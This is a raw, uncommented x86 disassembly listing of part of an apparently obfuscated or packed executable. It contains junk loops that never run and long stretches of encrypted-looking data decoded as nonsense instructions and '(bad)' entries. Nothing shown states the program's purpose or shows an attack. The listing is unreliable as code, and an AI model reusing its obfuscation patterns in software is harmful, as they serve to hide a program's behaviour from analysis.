  40a387:	jmp    0x40a39a
  40a38c:	xor    eax,eax
  40a38e:	xor    eax,DWORD PTR ds:0x4335fb
  40a394:	inc    eax
  40a395:	mov    ds:0x4335fb,eax
  40a39a:	cmp    DWORD PTR ds:0x4335fb,0x16
  40a3a1:	jae    0x40a3e1
  40a3a7:	cmp    DWORD PTR ds:0x4335fb,0x21
  40a3ae:	jne    0x40a3dc
  40a3b4:	push   DWORD PTR [ebp-0x10]
  40a3b7:	push   0x4336ef
  40a3bc:	push   DWORD PTR [ebp-0x1c]
  40a3bf:	push   0x43366b
  40a3c4:	push   0x6a7c
  40a3c9:	push   DWORD PTR [ebp-0x14]
  40a3cc:	push   0x4bcb
  40a3d1:	push   0x5e17
  40a3d6:	call   DWORD PTR ds:0x412358
  40a3dc:	jmp    0x40a38c
  40a3e1:	xor    edi,edi
  40a3e3:	mov    DWORD PTR ds:0x433667,0x1d
  40a3ed:	cmp    DWORD PTR ds:0x433667,0x0
  40a3f4:	je     0x40a44f
  40a3fa:	cmp    DWORD PTR ds:0x433667,0x3
  40a401:	jne    0x40a422
  40a407:	push   DWORD PTR [ebp-0xc]
  40a40a:	push   0x73f7
  40a40f:	push   DWORD PTR [ebp-0x24]
  40a412:	push   0x3e3a
  40a417:	push   0x433697
  40a41c:	call   DWORD PTR ds:0x4120e0
  40a422:	cmp    DWORD PTR ds:0x433667,0x4
  40a429:	jne    0x40a43a
  40a42f:	mov    eax,ds:0x433667
  40a434:	dec    eax
  40a435:	mov    ds:0x433667,eax
  40a43a:	mov    eax,ds:0x433667
  40a43f:	dec    eax
  40a440:	mov    ds:0x433667,eax
  40a445:	jmp    0x40a3ed
  40a44a:	or     eax,0x5ffd
  40a44f:	add    ecx,ebx
  40a451:	mov    DWORD PTR ds:0x43361f,0x630a
  40a45b:	mov    DWORD PTR [ebp-0x20],ecx
  40a45e:	mov    eax,ds:0x43372f
  40a463:	mov    eax,DWORD PTR [ebp-0x20]
  40a466:	je     0x40bc6c
  40a46c:	mov    eax,DWORD PTR [ebp-0x4]
  40a46f:	xor    eax,0x7510854
  40a474:	sbb    DWORD PTR ds:0x433723,0x4336a7
  40a47e:	add    eax,ebx
  40a480:	mov    DWORD PTR ds:0x433607,0x108a
  40a48a:	jmp    0x40a6ed
  40a48f:	imul   ecx,DWORD PTR [edx+eax*1+0x2f],0x21
  40a494:	jno    0x40a509
  40a496:	dec    eax
  40a497:	test   DWORD PTR [eax-0x44],esi
  40a49a:	pusha  
  40a49b:	xor    BYTE PTR [edx-0x11b3199e],ch
  40a4a1:	jle    0x40a521
  40a4a3:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a4a7:	dec    edx
  40a4a8:	stos   DWORD PTR es:[edi],eax
  40a4a9:	jl     0x40a528
  40a4ab:	inc    esp
  40a4ac:	jno    0x40a443
  40a4ae:	daa    
  40a4af:	sbb    eax,0xeb704935
  40a4b4:	gs retf 0x941f
  40a4b8:	mov    DWORD PTR [eax],esp
  40a4ba:	das    
  40a4bb:	adc    al,0x10
  40a4bd:	mov    ebp,0xac5896f8
  40a4c2:	sbb    al,0xa3
  40a4c4:	jge    0x40a4d5
  40a4c6:	and    al,0x9d
  40a4c8:	imul   ecx,esi,0x83faff8b
  40a4ce:	pop    ss
  40a4cf:	sub    DWORD PTR [ecx],edx
  40a4d1:	sbb    ebp,DWORD PTR [edi-0x5]
  40a4d4:	add    dh,dl
  40a4d6:	mov    ds:0xb5af4038,eax
  40a4db:	pop    esi
  40a4dc:	mov    al,0xfa
  40a4de:	inc    ecx
  40a4df:	fld    TBYTE PTR [ebp-0x10]
  40a4e2:	xor    al,0x57
  40a4e4:	(bad)  
  40a4e6:	adc    ch,bh
  40a4e8:	push   es
  40a4e9:	mov    dl,0x78
  40a4eb:	pop    edx
  40a4ec:	push   0x9eb9b9e0
  40a4f1:	inc    ebp
  40a4f2:	or     eax,0x49977ee
  40a4f7:	leave  
  40a4f8:	ins    DWORD PTR es:[edi],dx
  40a4f9:	mov    dl,0xfd
  40a4fb:	adc    edi,ecx
  40a4fd:	jb     0x40a4f6
  40a4ff:	ret    
  40a500:	int    0x31
  40a502:	inc    eax
  40a503:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a504:	loop   0x40a505
  40a506:	dec    edx
  40a507:	push   eax
  40a508:	loope  0x40a558
  40a50a:	xor    ch,dh
  40a50c:	fsub   DWORD PTR cs:[esi+eiz*4]
  40a510:	in     al,dx
  40a511:	icebp  
  40a512:	pop    edi
  40a513:	and    al,0x5d
  40a515:	and    cl,BYTE PTR [eax+ebx*1]
  40a518:	xchg   ecx,eax
  40a519:	pop    ss
  40a51a:	fdiv   DWORD PTR [esi+0x44]
  40a51d:	xor    al,0x57
  40a51f:	test   BYTE PTR [esi+eax*1+0x60],bl
  40a523:	push   es
  40a524:	mov    ebp,0xa1ff4ab0
  40a529:	nop
  40a52a:	(bad)  
  40a52b:	pop    ss
  40a52c:	sub    dl,ah
  40a52e:	lods   al,BYTE PTR ds:[esi]
  40a52f:	fmul   st,st(7)
  40a531:	fs out 0xfa,al
  40a534:	out    0x3e,al
  40a536:	int3   
  40a537:	gs gs add al,0x18
  40a53b:	ja     0x40a507
  40a53d:	das    
  40a53e:	and    edi,edx
  40a540:	shl    eax,0xff
  40a543:	call   0x6c0e174b
  40a548:	setbe  al
  40a54b:	cwde   
  40a54c:	xor    edx,0xffffffc5
  40a54f:	inc    ebp
  40a550:	call   0x30b9:0xed80a29b
  40a557:	push   0x28
  40a559:	repz mov edi,DWORD PTR [edx+0xd]
  40a55d:	int3   
  40a55e:	ja     0x40a5a2
  40a560:	pop    ebp
  40a561:	push   edx
  40a562:	mov    ecx,0x56a8c6f2
  40a567:	mov    dh,0x45
  40a569:	jno    0x40a4ee
  40a56b:	add    DWORD PTR [edi-0x1b],edx
  40a56e:	push   ebx
  40a56f:	mov    ds:0x1c54ff8c,al
  40a574:	dec    edi
  40a575:	xor    DWORD PTR [esi+0x7b],0xffffffe0
  40a579:	retf   0xd4bf
  40a57c:	fidiv  DWORD PTR [esi-0x5d459dc0]
  40a582:	out    dx,eax
  40a583:	jae    0x40a53e
  40a585:	lahf   
  40a586:	std    
  40a587:	das    
  40a588:	retf   0x3699
  40a58b:	mov    dl,0xc
  40a58d:	push   esp
  40a58e:	add    DWORD PTR [eax-0x52],eax
  40a591:	ins    DWORD PTR es:[edi],dx
  40a592:	lock pop edx
  40a594:	pop    ebx
  40a595:	shl    DWORD PTR fs:[eax+0x6b],cl
  40a599:	(bad)  
  40a59a:	jge    0x40a523
  40a59c:	aaa    
  40a59d:	(bad)  
  40a59e:	cmp    bh,dl
  40a5a0:	add    al,0xa7
  40a5a2:	aaa    
  40a5a3:	sbb    al,0x1f
  40a5a5:	add    eax,ecx
  40a5a7:	sub    al,0xf8
  40a5a9:	mov    WORD PTR [edx-0x69],gs
  40a5ac:	sbb    bl,BYTE PTR [esi+0x1b]
  40a5af:	xor    ecx,DWORD PTR [edx-0x308c0e72]
  40a5b5:	add    DWORD PTR [esi-0x2fd4e044],esi
  40a5bb:	jp     0x40a5a5
  40a5bd:	xor    bl,ch
  40a5bf:	jp     0x40a62a
  40a5c1:	xchg   esp,eax
  40a5c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5c3:	imul   edx,DWORD PTR [eax+ecx*8-0x507aa50c],0xffffffa9
  40a5cb:	das    
  40a5cc:	or     cl,BYTE PTR [esi+eax*8]
  40a5cf:	loop   0x40a598
  40a5d1:	pushf  
  40a5d2:	inc    ebp
  40a5d3:	cmp    eax,DWORD PTR [ebp-0x1d4542c3]
  40a5d9:	mov    ds:0xddd6c838,al
  40a5de:	(bad)  
  40a5df:	mov    ss,WORD PTR [esi-0x604b8f6a]
  40a5e5:	jmp    0x2cd90e4a
  40a5ea:	xor    eax,DWORD PTR [ebx-0x2f]
  40a5ed:	or     al,0xa
  40a5ef:	stos   BYTE PTR es:[edi],al
  40a5f0:	adc    al,0xc0
  40a5f2:	fdiv   QWORD PTR [eax]
  40a5f4:	push   es
  40a5f5:	jmp    0x5af6:0xeb4ffd18
  40a5fc:	sahf   
  40a5fd:	mov    ebx,0xc8d622cf
  40a602:	(bad)  
  40a603:	ds ins BYTE PTR es:[edi],dx
  40a605:	pusha  
  40a606:	les    edi,FWORD PTR [edi-0x54]
  40a609:	or     BYTE PTR [eax+0x14bd0e88],0xd0
  40a610:	pop    ds
  40a611:	inc    bp
  40a613:	mov    bl,BYTE PTR [esi+0x778fbbac]
  40a619:	jns    0x40a61a
  40a61b:	push   ecx
  40a61c:	stc    
  40a61d:	stos   BYTE PTR es:[edi],al
  40a61e:	mov    ds:0x47f27504,al
  40a623:	xchg   ebx,eax
  40a624:	fist   DWORD PTR [edx+ecx*4+0x7d6595bc]
  40a62b:	cmp    DWORD PTR [eax-0x11db19de],ecx
  40a631:	mov    eax,0x2a74ff87
  40a636:	fnsave [ebx]
  40a638:	out    0xaf,al
  40a63a:	cmp    ebp,edi
  40a63c:	js     0x40a677
  40a63e:	stc    
  40a63f:	not    BYTE PTR [eax+0xe7653c4]
  40a645:	out    0x94,eax
  40a647:	push   edx
  40a648:	jge    0x40a5e4
  40a64a:	xchg   edi,eax
  40a64b:	sub    bh,BYTE PTR [eax-0x5d]
  40a64e:	icebp  
  40a64f:	(bad)  
  40a650:	pop    ds
  40a651:	cmp    DWORD PTR [edi+0x7d74c740],ecx
  40a657:	enter  0x5902,0xc
  40a65b:	out    dx,al
  40a65c:	mov    edi,ecx
  40a65e:	cdq    
  40a65f:	popf   
  40a660:	mov    dh,0xb5
  40a662:	pop    edi
  40a663:	test   al,al
  40a665:	ja     0x40a6af
  40a667:	out    dx,al
  40a668:	xlat   BYTE PTR ds:[ebx]
  40a669:	sub    ebp,DWORD PTR [edi-0x10]
  40a66c:	(bad)  
  40a66d:	adc    al,0xbd
  40a66f:	cdq    
  40a670:	mov    ds:0xb93d569e,al
  40a675:	inc    ecx
  40a676:	sbb    ebp,edx
  40a678:	nop
  40a679:	out    dx,al
  40a67a:	popf   
  40a67b:	scas   al,BYTE PTR es:[edi]
  40a67c:	fs pop esi
  40a67e:	shl    ch,cl
  40a680:	pop    ss
  40a681:	pop    es
  40a682:	ja     0x40a61a
  40a684:	cmp    esi,ebx
  40a686:	mov    esi,0xafb61acc
  40a68b:	cwde   
  40a68c:	sbb    al,0xa2
  40a68e:	fadd   QWORD PTR [ebp-0x63]
  40a691:	repnz icebp 
  40a693:	xchg   dl,dl
  40a695:	mov    bh,0xfd
  40a697:	sub    al,al
  40a699:	call   0x9065cef4
  40a69e:	inc    BYTE PTR [edx-0xe]
  40a6a1:	xor    eax,0xb29f9115
  40a6a6:	pop    edi
  40a6a7:	push   ebp
  40a6a8:	nop
  40a6a9:	xchg   ebx,eax
  40a6aa:	fs int3 
  40a6ac:	xor    BYTE PTR ds:[edi+edx*2],0x2c
  40a6b1:	pop    ss
  40a6b2:	pop    eax
  40a6b3:	jp     0x40a6ef
  40a6b5:	lock test DWORD PTR [eax],ebp
  40a6b8:	inc    edi
  40a6b9:	mov    al,0x5b
  40a6bb:	mov    ds:0x96a9b8d1,al
  40a6c0:	sbb    ecx,edx
  40a6c2:	or     eax,0x3ebbdd15
  40a6c7:	scas   eax,DWORD PTR es:[edi]
  40a6c8:	(bad)  [edx]
  40a6ca:	mov    ch,0x80
  40a6cc:	repz push esi
  40a6ce:	rcl    DWORD PTR [edi-0x52e00532],1
  40a6d4:	jle    0x40a699
  40a6d6:	daa    
  40a6d7:	cmp    eax,0x19d8ef82
  40a6dc:	cmc    
  40a6dd:	ss lahf 
  40a6df:	loop   0x40a720
  40a6e1:	inc    edi
  40a6e2:	mov    ch,0x65
  40a6e4:	imul   esi,DWORD PTR [edi-0x591957f2],0x3bad3e14
  40a6ee:	clc    
  40a6ef:	mov    DWORD PTR ds:0x43366b,0x5aa8
  40a6f9:	jne    0x40b4e6
  40a6ff:	adc    DWORD PTR ds:0x433657,0xbfa
  40a709:	push   DWORD PTR [ebp+0x8]
  40a70c:	add    DWORD PTR ds:0x4336e7,0x7522
  40a716:	call   0x4115fc
  40a71b:	sbb    ecx,0x1aca
  40a721:	mov    DWORD PTR [ebp-0x20],eax
  40a724:	mov    eax,DWORD PTR [ebp-0x4]
  40a727:	xor    esi,esi
  40a729:	xor    esi,DWORD PTR ds:0x433717
  40a72f:	or     DWORD PTR ds:0x433723,esi
  40a735:	mov    ecx,DWORD PTR [ebp-0x20]
  40a738:	mov    esi,0x7510854
  40a73d:	xor    eax,esi
  40a73f:	add    DWORD PTR ds:0x433713,0x433607
  40a749:	add    eax,ebx
  40a74b:	mov    DWORD PTR ds:0x4336af,0x4f05
  40a755:	cmp    ecx,eax
  40a757:	mov    DWORD PTR ds:0x433667,0x525
  40a761:	je     0x40b9ed
  40a767:	add    DWORD PTR ds:0x4336ef,0x3590
  40a771:	push   DWORD PTR [ebp-0x20]
  40a774:	xor    DWORD PTR ds:0x4335ff,0x1906
  40a77e:	push   DWORD PTR [ebp+0x8]
  40a781:	dec    DWORD PTR ds:0x4336db
  40a787:	call   0x40eac8
  40a78c:	movzx  ecx,WORD PTR ds:0x43360b
  40a793:	sub    DWORD PTR ds:0x433623,ecx
  40a799:	jmp    0x40a9fc
  40a79e:	or     al,0xd4
  40a7a0:	and    ah,bl
  40a7a2:	loopne 0x40a78c
  40a7a4:	shl    ah,1
  40a7a6:	sti    
  40a7a7:	and    eax,0xcf4bec0c
  40a7ac:	inc    edx
  40a7ad:	in     eax,dx
  40a7ae:	push   ss
  40a7af:	in     eax,dx
  40a7b0:	jle    0x40a830
  40a7b2:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40a7b6:	jl     0x40a81a
  40a7b8:	ins    DWORD PTR es:[edi],dx
  40a7b9:	lock jbe 0x40a833
  40a7bc:	adc    al,0xfb
  40a7be:	pop    ebp
  40a7bf:	pop    ecx
  40a7c0:	push   ebx
  40a7c1:	add    BYTE PTR [ecx],al
  40a7c3:	xor    BYTE PTR [edi-0x1a89c2da],ah
  40a7c9:	(bad)  
  40a7ca:	shl    DWORD PTR [ecx],1
  40a7cc:	cmp    BYTE PTR [edx],0xef
  40a7cf:	mov    edi,edx
  40a7d1:	out    0x6d,eax
  40a7d3:	cs cdq 
  40a7d5:	stos   DWORD PTR es:[edi],eax
  40a7d6:	add    esp,0x2b824f58
  40a7dc:	jl     0x40a7ef
  40a7de:	jp     0x40a7a9
  40a7e0:	push   0xadac404a
  40a7e5:	sahf   
  40a7e6:	xchg   esi,eax
  40a7e7:	push   ebp
  40a7e8:	stos   BYTE PTR es:[edi],al
  40a7e9:	push   0x17082a19
  40a7ee:	rcr    esi,cl
  40a7f0:	pop    ds
  40a7f1:	fwait
  40a7f2:	lods   eax,DWORD PTR ds:[esi]
  40a7f3:	shl    DWORD PTR ds:0x152f3bed,1
  40a7f9:	std    
  40a7fa:	dec    DWORD PTR [ebp+0x11bb732c]
  40a800:	pusha  
  40a801:	rep lods eax,DWORD PTR ds:[esi]
  40a803:	mov    esi,0xde061b13
  40a808:	(bad)  
  40a809:	mov    al,0xee
  40a80b:	imul   dx,WORD PTR [eax+0x17f3b301],0xfcae
  40a814:	stos   DWORD PTR es:[edi],eax
  40a815:	pushf  
  40a816:	retf   0xa1d9
  40a819:	cmp    BYTE PTR [ecx+0x6b],dl
  40a81c:	mov    al,0x87
  40a81e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a81f:	jle    0x40a7d4
  40a821:	fist   DWORD PTR [esi-0x32]
  40a824:	jo     0x40a811
  40a826:	addr16 (bad) 
  40a829:	sar    ebp,1
  40a82b:	test   BYTE PTR [edi-0x16d01048],ah
  40a831:	loop   0x40a82f
  40a833:	out    dx,eax
  40a834:	mov    eax,ds:0x889b6255
  40a839:	jne    0x40a820
  40a83b:	mov    dh,0x8c
  40a83d:	xlat   BYTE PTR ds:[ebx]
  40a83e:	dec    esi
  40a83f:	sub    DWORD PTR [ebx],esi
  40a841:	lds    esi,FWORD PTR [ebx+eax*8]
  40a844:	test   DWORD PTR [ebx],0x665a9ad2
  40a84a:	out    0x98,al
  40a84c:	xchg   DWORD PTR [ecx-0x5fd76185],esi
  40a852:	repnz mov esp,0xc61ec6f0
  40a858:	mov    bh,0x5
  40a85a:	sbb    eax,0x278ff685
  40a85f:	gs (bad) 
  40a862:	sub    BYTE PTR [edx-0x4d03d28a],ch
  40a868:	jge    0x40a7ee
  40a86a:	dec    eax
  40a86b:	push   0xd7da3fb6
  40a870:	(bad)  
  40a871:	adc    BYTE PTR [esi],bl
  40a873:	dec    ebx
  40a874:	sbb    cl,0x0
  40a877:	stc    
  40a878:	sar    DWORD PTR [ecx+0x560bb00c],cl
  40a87e:	cdq    
  40a87f:	push   eax
  40a880:	neg    DWORD PTR [esi+ecx*8]
  40a883:	mov    BYTE PTR [ebx+0x522feb2],dh
  40a889:	(bad)  [esi-0x16]
  40a88c:	(bad)  
  40a88d:	out    0x2a,eax
  40a88f:	cmp    DWORD PTR [eax-0x52ee4337],ecx
  40a895:	sub    cl,BYTE PTR [edi+edi*4]
  40a898:	cmp    esp,eax
  40a89a:	imul   ebx,DWORD PTR [ebp-0x3c39f56c],0x552faa76
  40a8a4:	cmp    ecx,DWORD PTR [ecx+edi*2-0x72]
  40a8a8:	cmp    esi,DWORD PTR [eax+0x5c5a7cc6]
  40a8ae:	iret   
  40a8af:	add    BYTE PTR [ebp+ecx*1-0x2372ab00],cl
  40a8b6:	ds push eax
  40a8b8:	rol    ebx,1
  40a8ba:	push   esp
  40a8bb:	mov    ch,0x4d
  40a8bd:	sti    
  40a8be:	mov    ds:0x7901327a,al
  40a8c3:	dec    esi
  40a8c4:	mov    eax,0x1562548
  40a8c9:	imul   esp,DWORD PTR [eax],0x57da38ad
  40a8cf:	push   esi
  40a8d0:	dec    eax
  40a8d1:	cwde   
  40a8d2:	push   edx
  40a8d3:	(bad)  
  40a8d4:	repz push ecx
  40a8d6:	xor    BYTE PTR [edi],cl
  40a8d8:	dec    ebp
  40a8d9:	mov    eax,0x5fa55760
  40a8de:	mov    edi,0xdb8d09db
  40a8e3:	(bad)  
  40a8e4:	mov    dl,0xc2
  40a8e6:	fimul  WORD PTR [ebx+eax*1+0x43]
  40a8eb:	ss inc edi
  40a8ed:	xlat   BYTE PTR ds:[ebx]
  40a8ee:	push   0x595d0a8e
  40a8f3:	pop    ecx
  40a8f4:	dec    ebp
  40a8f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8f6:	retf   
  40a8f7:	lock push edi
  40a8f9:	iret   
  40a8fa:	ins    BYTE PTR es:[edi],dx
  40a8fb:	pop    ss
  40a8fc:	into   
  40a8fd:	ins    DWORD PTR es:[edi],dx
  40a8fe:	mov    ebx,0x9bde1766
  40a903:	pop    eax
  40a904:	call   FWORD PTR [ecx]
  40a906:	nop
  40a907:	xor    ah,BYTE PTR [edx+ebp*2+0x5a]
  40a90b:	jmp    0x8a548377
  40a910:	inc    edi
  40a911:	int3   
  40a912:	adc    DWORD PTR [esi+eax*4],esi
  40a915:	(bad)  
  40a916:	cmc    
  40a917:	mov    dl,0xc8
  40a919:	mov    al,ds:0xa88da918
  40a91e:	out    dx,al
  40a91f:	pop    eax
  40a920:	(bad)
  40a925:	clc    
  40a926:	jecxz  0x40a8ac
  40a928:	ror    DWORD PTR [ebx-0x205d1590],1
  40a92e:	enter  0x99de,0xf6
  40a932:	cmp    esi,DWORD PTR [esi-0x12]
  40a935:	push   cs
  40a936:	or     dh,BYTE PTR [eax+0x6e]
  40a939:	inc    ebx
  40a93a:	and    edx,edx
  40a93c:	mov    dh,0xd5
  40a93e:	mov    al,ds:0xf5449da1
  40a943:	fcom   QWORD PTR ds:0x25a725f3
  40a949:	(bad)  
  40a94a:	std    
  40a94b:	mov    ?,esp
  40a94d:	xchg   ebp,eax
  40a94e:	jnp    0x40a93b
  40a950:	and    cl,BYTE PTR ss:[eax-0x4af2c826]
  40a957:	call   0x88ba:0x23f0a6f0
  40a95e:	jno    0x40a920
  40a960:	add    eax,0xe6c10f27
  40a965:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a966:	mov    ebp,esp
  40a968:	mov    ds:0x200d9b25,al
  40a96d:	dec    edx
  40a96e:	adc    eax,0xe4223fcd
  40a973:	cmp    BYTE PTR [eax+0x7ebb186f],ch
  40a979:	and    bl,bh
  40a97b:	ror    BYTE PTR [eax-0x5038853c],cl
  40a981:	or     al,0x18
  40a983:	das    
  40a984:	adc    dl,ch
  40a986:	xchg   esp,eax
  40a987:	aaa    
  40a988:	test   al,0xb0
  40a98a:	mov    ebx,fs
  40a98c:	pushf  
  40a98d:	aas    
  40a98e:	rol    al,0x19
  40a991:	xor    al,0xbb
  40a993:	xor    cl,BYTE PTR [edi]
  40a995:	pop    ebx
  40a996:	mov    BYTE PTR [ecx+0x69],dl
  40a999:	leave  
  40a99a:	adc    bh,ch
  40a99c:	xchg   BYTE PTR [eax-0x39b34095],cl
  40a9a2:	rcl    BYTE PTR fs:[esi+0x33],0x5a
  40a9a7:	mov    ebp,0x68d329cc
  40a9ac:	push   ecx
  40a9ad:	xor    bh,BYTE PTR [eax+eiz*1-0x52cf5a03]
  40a9b4:	inc    ecx
  40a9b5:	(bad)  
  40a9b6:	jl     0x40a9aa
  40a9b8:	and    DWORD PTR [esi-0x42],eax
  40a9bb:	mov    al,ds:0x6542cb34
  40a9c0:	jnp    0x40aa3b
  40a9c2:	add    al,0x75
  40a9c4:	or     ecx,ebp
  40a9c6:	scas   eax,DWORD PTR es:[edi]
  40a9c7:	xchg   ecx,eax
  40a9c8:	inc    esi
  40a9c9:	push   ebp
  40a9ca:	int    0x60
  40a9cc:	sahf   
  40a9cd:	popa   
  40a9ce:	out    0x40,al
  40a9d0:	out    0x51,eax
  40a9d2:	out    0x1f,al
  40a9d4:	scas   eax,DWORD PTR es:[edi]
  40a9d5:	xchg   edx,eax
  40a9d6:	nop
  40a9d7:	jmp    0x27:0x9ed97d07
  40a9de:	in     eax,dx
  40a9df:	xchg   DWORD PTR [edi+eiz*1],esp
  40a9e2:	outs   dx,DWORD PTR ds:[esi]
  40a9e3:	and    edx,DWORD PTR [ebx-0x21f68857]
  40a9e9:	sub    eax,0xccb8a028
  40a9ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9ef:	jae    0x40aa18
  40a9f1:	out    0x13,al
  40a9f3:	and    BYTE PTR [eax],al
  40a9f5:	lods   al,BYTE PTR ds:[esi]
  40a9f6:	mov    esp,0xff367263
  40a9fb:	mov    ebp,0x8bec4589
  40aa00:	inc    ebp
  40aa01:	cld    
  40aa02:	xor    DWORD PTR ds:0x433617,edi
  40aa08:	mov    ecx,DWORD PTR [ebp-0x14]
  40aa0b:	xor    eax,esi
  40aa0d:	adc    DWORD PTR ds:0x433717,0x4336e7
  40aa17:	add    eax,ebx
  40aa19:	mov    DWORD PTR ds:0x433667,0x6600
  40aa23:	jmp    0x40ac86
  40aa28:	dec    ebp
  40aa29:	ret    
  40aa2a:	xchg   esp,eax
  40aa2b:	push   eax
  40aa2c:	nop
  40aa2d:	push   ecx
  40aa2e:	dec    ecx
  40aa2f:	ret    
  40aa30:	mov    esp,DWORD PTR es:[edx+eiz*2]
  40aa34:	pop    es
  40aa35:	push   0xebd0d15d
  40aa3a:	jle    0x40aaba
  40aa3c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40aa40:	and    al,dl
  40aa42:	(bad)  
  40aa43:	sbb    ebp,DWORD PTR [ebx]
  40aa45:	sbb    eax,0x5f08b63d
  40aa4a:	jmp    0x72ee:0x5f7212d4
  40aa51:	sbb    DWORD PTR [edx+0x5eb7a12a],eax
  40aa57:	dec    ebx
  40aa58:	scas   eax,DWORD PTR es:[edi]
  40aa59:	sub    edi,DWORD PTR [ebp+0x4e]
  40aa5c:	inc    eax
  40aa5d:	dec    ebp
  40aa5e:	into   
  40aa5f:	jnp    0x40aab0
  40aa61:	addr16 inc ebx
  40aa63:	pop    esi
  40aa64:	sbb    dl,BYTE PTR [esi-0x6bc0a7f6]
  40aa6a:	fstp   QWORD PTR [edx-0x1c523fb3]
  40aa70:	neg    DWORD PTR [esi-0x60]
  40aa73:	loop   0x40aaf2
  40aa75:	sti    
  40aa76:	(bad)  
  40aa78:	mov    ds:0x5dfb7199,al
  40aa7d:	fidivr DWORD PTR [eax-0xd11808d]
  40aa83:	adc    eax,0x2eb0c9d2
  40aa88:	test   DWORD PTR [edx],0xa39464d4
  40aa8e:	jo     0x40aaf7
  40aa90:	pop    eax
  40aa91:	inc    ecx
  40aa92:	enter  0x752f,0x6
  40aa96:	ficomp WORD PTR [ebx+0x6]
  40aa99:	cld    
  40aa9a:	out    0xc5,eax
  40aa9c:	(bad)  
  40aa9e:	psrad  mm2,QWORD PTR [edi+0x75]
  40aaa2:	pusha  
  40aaa3:	bound  ebx,QWORD PTR [esi+0x5aaec1a8]
  40aaa9:	dec    ecx
  40aaaa:	ret    0xd4c2
  40aaad:	mov    ebx,0x6772bb1b
  40aab2:	mov    edx,0xbfd6d0e3
  40aab7:	enter  0x3ce3,0xa5
  40aabb:	mov    eax,ds:0x5ef26ead
  40aac0:	repnz ins DWORD PTR es:[edi],dx
  40aac2:	jnp    0x40aa92
  40aac4:	in     eax,dx
  40aac5:	xor    BYTE PTR [ebx],ah
  40aac7:	loop   0x40aa64
  40aac9:	mov    edx,0x5bf6ea39
  40aace:	pop    es
  40aacf:	dec    ebx
  40aad0:	sbb    eax,0x63171a8b
  40aad5:	loopne 0x40aaa3
  40aad7:	mov    ebx,0x83333380
  40aadc:	shl    cl,1
  40aade:	ins    DWORD PTR es:[edi],dx
  40aadf:	pop    ss
  40aae0:	mov    ecx,0xcd766a79
  40aae5:	sti    
  40aae6:	mov    esp,0xbf5c158e
  40aaeb:	nop
  40aaec:	ror    DWORD PTR [esi],1
  40aaee:	mov    ecx,DWORD PTR [eax-0x2e]
  40aaf1:	hlt    
  40aaf2:	dec    eax
  40aaf3:	outs   dx,BYTE PTR ds:[esi]
  40aaf4:	mov    BYTE PTR [eax+0x65],ah
  40aaf7:	add    al,0xe8
  40aaf9:	adc    ebx,DWORD PTR [eax-0x23fec720]
  40aaff:	fisubr DWORD PTR [edi]
  40ab01:	xchg   ecx,eax
  40ab02:	mov    cl,0xf9
  40ab04:	stos   BYTE PTR es:[edi],al
  40ab05:	mov    esi,0x1ca52b62
  40ab0a:	pop    edi
  40ab0b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab0c:	cdq    
  40ab0d:	push   ecx
  40ab0e:	test   eax,0x6e6bc0c4
  40ab13:	mov    edx,0x4bef086
  40ab18:	xchg   edi,eax
  40ab19:	or     eax,0x5af4f0e8
  40ab1e:	lds    edx,FWORD PTR [ecx+0x72]
  40ab21:	mov    al,0x41
  40ab23:	xchg   BYTE PTR [eax+0x2b],cl
  40ab26:	push   ss
  40ab27:	xchg   BYTE PTR [ecx],bl
  40ab29:	xor    DWORD PTR [edi],esp
  40ab2b:	dec    edi
  40ab2c:	aad    0x48
  40ab2e:	jno    0x40abab
  40ab30:	(bad)  
  40ab31:	fsubr  QWORD PTR [edx]
  40ab33:	sbb    eax,0x82be374
  40ab38:	shr    DWORD PTR [eax+0x5915e753],1
  40ab3e:	mov    ds:0x91e6c002,al
  40ab43:	xchg   ecx,eax
  40ab44:	pop    DWORD PTR [edx+ebp*2-0x1b]
  40ab48:	pusha  
  40ab49:	mov    dh,0xb9
  40ab4b:	mov    ah,0xd9
  40ab4d:	mov    ss,WORD PTR [edx-0x4a51d36a]
  40ab53:	dec    ebx
  40ab54:	arpl   sp,si
  40ab56:	mov    al,ds:0x6a6f3c79
  40ab5b:	jb     0x40ab27
  40ab5d:	(bad)  
  40ab5f:	sar    DWORD PTR [edx],0xa4
  40ab62:	pop    ss
  40ab63:	or     edi,DWORD PTR [ebp+0x4301f350]
  40ab69:	lds    ecx,FWORD PTR [ecx]
  40ab6b:	and    cl,ah
  40ab6d:	push   ebx
  40ab6e:	pop    ebx
  40ab6f:	cmp    al,0x34
  40ab71:	loop   0x40abcb
  40ab73:	out    0xa3,eax
  40ab75:	add    ebp,DWORD PTR [esi-0x6]
  40ab78:	cmp    cl,BYTE PTR [ebx+0x5d]
  40ab7b:	inc    eax
  40ab7c:	arpl   WORD PTR [ecx],bx
  40ab7e:	or     DWORD PTR [esp+ebx*4+0x6a],eax
  40ab82:	ins    BYTE PTR es:[edi],dx
  40ab83:	push   ss
  40ab84:	push   ebp
  40ab85:	mov    ah,0x3
  40ab87:	dec    ebx
  40ab88:	nop
  40ab89:	adc    al,0xb3
  40ab8b:	mov    ch,0x27
  40ab8d:	mov    bl,0x11
  40ab8f:	inc    ecx
  40ab90:	ffreep st(4)
  40ab92:	shl    DWORD PTR [edi+ebx*2+0x7a899f95],1
  40ab99:	mov    ch,BYTE PTR [ebp-0x29aee9f]
  40ab9f:	test   DWORD PTR [edi-0x5],ebp
  40aba2:	punpcklwd mm3,DWORD PTR [edi+0x2e994994]
  40aba9:	into   
  40abaa:	es jmp 0xff72c711
  40abb0:	pop    esp
  40abb1:	lahf   
  40abb2:	je     0x40abcc
  40abb4:	dec    ebp
  40abb5:	push   cs
  40abb6:	add    BYTE PTR [ebx+ebx*2-0x25],0x6f
  40abbb:	lds    esp,FWORD PTR [eax+0x334185]
  40abc1:	out    0x83,al
  40abc3:	jmp    0x40abef
  40abc5:	inc    ecx
  40abc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abc7:	test   DWORD PTR [ecx*1+0x6047a822],0xa40cf32a
